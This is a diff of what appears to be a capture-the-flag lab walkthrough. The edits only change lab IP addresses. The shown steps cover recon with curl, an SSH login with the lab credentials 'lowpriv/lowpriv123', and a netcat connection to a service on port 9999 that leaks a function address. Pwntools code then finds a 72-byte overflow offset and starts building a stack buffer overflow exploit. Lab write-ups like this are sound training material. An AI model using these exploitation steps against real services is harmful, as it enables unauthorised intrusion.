@@ -8,13 +8,13 @@
 
 **Step 1 — Recon the web hint page:**
 ```bash
-curl http://172.100.0.10
+curl http://10.10.10.10
 # Page mentions: lowpriv / lowpriv123 and port 9999
 ```
 
 **Step 2 — SSH in:**
 ```bash
-ssh lowpriv@172.100.0.11
+ssh lowpriv@10.10.10.11
 # Password: lowpriv123
 ```
 
@@ -29,7 +29,7 @@ cat /home/lowpriv/user.txt
 
 **Step 1 — Connect to the vuln service to get the leaked address:**
 ```bash
-nc 172.100.0.11 9999
+nc 10.10.10.11 9999
 # Output: "secret_function() is at: 0x<address>"
 ```
 
@@ -44,7 +44,7 @@ python3 /root/tools/exploit_template.py
 With GDB on the attacker (or the template):
 ```python
 from pwn import *
-io = remote('172.100.0.11', 9999)
+io = remote('10.10.10.11', 9999)
 io.recvline()   # discard the address leak line
 io.send(cyclic(200))
 # Crash occurs; offset is 72 bytes for the 64-byte buffer + 8-byte saved RBP
@@ -53,7 +53,7 @@ io.send(cyclic(200))
 **Step 3 — Build and send the exploit:**
 ```python
 from pwn import *
-TARGET = '172.100.0.11'
+TARGET = '10.10.10.11'
 PORT   = 9999
 OFFSET = 72                    # 64-byte buf + 8-byte saved RBP
 SECRET = 0x<leaked_address>    # replace with actual leaked value
